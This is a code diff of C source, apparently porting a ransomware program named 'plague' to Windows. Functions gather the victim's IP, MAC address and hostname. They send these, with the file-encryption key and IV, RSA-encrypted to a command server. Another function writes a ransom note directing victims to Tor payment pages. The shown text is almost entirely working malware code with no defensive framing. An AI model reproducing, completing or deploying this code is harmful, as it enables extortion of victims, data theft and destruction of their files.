@@ -1,10 +1,3 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <netdb.h>
 
 #include "includes/plague.h"
 
@@ -14,142 +7,151 @@ void error(const char *msg)
     exit(0);
 }
 
-struct ifaddrs * ifAddrStruct=NULL;
-struct ifaddrs * ifa=NULL;
-void * tmpAddrPtr=NULL;
-
-char *get_privateIP()
+void get_network_info(char **ip, char **mac)
 {
-    char *priv_ip;
+    PIP_ADAPTER_INFO pAdapterInfo;
+    PIP_ADAPTER_INFO pAdapter = NULL;
+    DWORD dwRetVal = 0;
+    ULONG ulOutBufLen = sizeof (IP_ADAPTER_INFO);
 
-    getifaddrs(&ifAddrStruct);
-    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
-        if (!ifa->ifa_addr) {
-            continue;
-        }
-        if (ifa->ifa_addr->sa_family == AF_INET)
-        {   // check it is IP4
-            // is a valid IP4 Address
-            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
-            char addressBuffer[INET_ADDRSTRLEN];
-            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
-            //printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer);
-            priv_ip = addressBuffer;
+    if (!(*mac = malloc(sizeof(char) * 18)))
+        return ;
+    pAdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof (IP_ADAPTER_INFO));
+    if (pAdapterInfo == NULL)
+        return ;
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
+    {
+        free(pAdapterInfo);
+        pAdapterInfo = (IP_ADAPTER_INFO *) malloc(ulOutBufLen);
+        if (pAdapterInfo == NULL)
+        {
+            free(*mac);
+            return ;
         }
     }
-    if (ifAddrStruct!=NULL)
-        freeifaddrs(ifAddrStruct);
-    return strdup(priv_ip);
+    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
+    {
+        pAdapter = pAdapterInfo;
+        while (pAdapter)
+        {
+            if (pAdapter->AddressLength >= 6)
+            {
+                sprintf(*mac, "%02X:%02X:%02X:%02X:%02X:%02X",
+                        pAdapter->Address[0], pAdapter->Address[1],
+                        pAdapter->Address[2], pAdapter->Address[3],
+                        pAdapter->Address[4], pAdapter->Address[5]);
+            }
+            else
+            {
+                free(*mac);
+                mac = NULL;
+            }
+            *ip = strdup(pAdapter->IpAddressList.IpAddress.String);
+            pAdapter = pAdapter->Next;
+        }
+    }
+    if (pAdapterInfo)
+        free(pAdapterInfo);
 }
 
 char *get_hostname()
 {
-    char hostname[1024];
+    DWORD  BUF_SIZE = 1024;
+    TCHAR  infoBuf[BUF_SIZE];
 
-    hostname[1023] = '\0';
-    gethostname(hostname, 1023);
-    return strdup(hostname);
+    GetComputerName( infoBuf, &BUF_SIZE);
+    return strdup(infoBuf);
 }
 
 void write_readme(char *id)
 {
     FILE *fp;
-    fp = fopen("README.txt","w+");
-    fprintf(fp, "All your files are encrypted. Go to http://localhost/plague_server/?id=%s to know how to get your data recovered\n", id);
+    fp = fopen("README-PLAGUE.txt","w+");
+    fprintf(fp, "All your files are encrypted.\n");
+    fprintf(fp, "Go to one of those link to know how to get your data recovered :\n");
+    fprintf(fp, "- http://%s.sh/?id=%s\n\n", SRV_ADDR, id);
+    fprintf(fp, "- http://%s.tor2web/?id=%s\n\n", SRV_ADDR, id);
+    fprintf(fp, "If links are not available, follow this steps :\n");
+    fprintf(fp, "- Download and install TOR browser (on this link : https://www.torproject.org/download/).\n");
+    fprintf(fp, "- Run the TOR browser.\n");
+    fprintf(fp, "- Tape in the address bar : http://%s/?id=%s\n", SRV_ADDR, id);
+    fprintf(fp, "- Follow the instruction on the site.\n");
     fclose(fp);
 }
 
-
 char *send_request(char *message)
 {
-    struct hostent *server;
-    struct sockaddr_in serv_addr;
-    int sockfd, bytes, sent, received, total;
-    int port = 80;
-    char *host = "localhost";
+    WSADATA wsa;
+    SOCKET s;
+    struct sockaddr_in server;
     char *response;
+    int recv_size;
+    char *host = SRV_ADDR;
+    int port = 80;
 
     if (!(response = malloc(sizeof(char) * RESPONSE_SIZE)))
         exit(0);
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
+        return NULL;
 
-    /* create the socket */
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0)
-        error("ERROR opening socket");
+    //Create a socket
+    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+        printf("Could not create socket : %d", WSAGetLastError());
 
-    /* lookup the ip address */
-    server = gethostbyname(host);
-    if (server == NULL)
-        error("ERROR, no such host");
+    server.sin_addr.s_addr = inet_addr(host);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
 
-    /* fill in the structure */
-    memset(&serv_addr, 0, sizeof(serv_addr));
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(port);
-    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr, server->h_length);
+    //Connect to remote server
+    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
+        return NULL;
 
-    /* connect the socket */
-    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
-        error("ERROR connecting");
+    //Send some data
+    if( send(s , message , strlen(message) , 0) < 0)
+        return NULL;
 
-    /* send the request */
-    total = (int)strlen(message);
-    sent = 0;
-    do {
-        bytes = write(sockfd, message + sent, total - sent);
-        if (bytes < 0)
-            error("ERROR writing message to socket");
-        if (bytes == 0)
-            break;
-        sent += bytes;
-    } while (sent < total);
-
-    /* receive the response */
-    memset(response, 0, RESPONSE_SIZE);
-    total = sizeof(char) * RESPONSE_SIZE;
-    received = 0;
-    do {
-        bytes = read(sockfd, response + received, total - received);
-        if (bytes < 0)
-            error("ERROR reading response from socket");
-        if (bytes == 0)
-            break;
-        received += bytes;
-    } while (received < total);
-    if (received == total)
-        error("ERROR storing complete response from socket");
-
-    /* close the socket */
-    close(sockfd);
+    //Receive a reply from the server
+    if((recv_size = recv(s, response, 2000 ,0)) == SOCKET_ERROR)
+        puts("recv failed");
+    response[recv_size] = '\0';
     return response;
 }
 
-int send_key(char *key, char *iv, char *hostname)
+int send_key(char *key, char *iv)
 {
     char json[1024], message[4096];
     char *response;
+    char *priv_ip, *mac;
     size_t len = 0;
     unsigned char *data;
-    char *request = "POST /plague_server/ HTTP/1.1\r\n"
-                    "Host: localhost\r\n"
+    char *request = "POST / HTTP/1.1\r\n"
+                    "Host: %s\r\n"
                     "Content-Type:  application/x-www-form-urlencoded\r\n"
                     "Content-Length: %d\r\n\r\n"
                     "data=%s";
-    char *format = "{\"key\":\"%s\",\"iv\":\"%s\",\"PrivateIP\":\"%s\",\"hostname\":\"%s\"}";
+    char *format = "{\"key\":\"%s\",\"iv\":\"%s\",\"PrivateIP\":\"%s\",\"mac\":\"%s\",\"hostname\":\"%s\"}";
     char *encoded;
     int ret = 0;
 
+    get_network_info(&priv_ip, &mac);
+
     /* fill in the parameters */
-    sprintf(json, format, key, iv, get_privateIP(), hostname);
+    sprintf(json, format, key, iv, priv_ip, mac, get_hostname());
 
     // encode data
     data = rsa_encode((unsigned char *)json, &len); //encode
+
     // encoded = base64_encode(data, len, &len);
     encoded = bin2hex(data, len);
+
     // printf("b64 data    : %s\n", encoded);
-    sprintf(message, request, strlen("data=") + strlen((char *)encoded), encoded);
+    sprintf(message, request, SRV_ADDR, strlen("data=") + strlen((char *)encoded), encoded);
+    printf("message : %s\n", message);
+    system("PAUSE");
 
     response = send_request(message);
+    printf("response : %s\n", response);
+    system("PAUSE");
 
     /* process response */
     char *id = strstr(response, "id:");
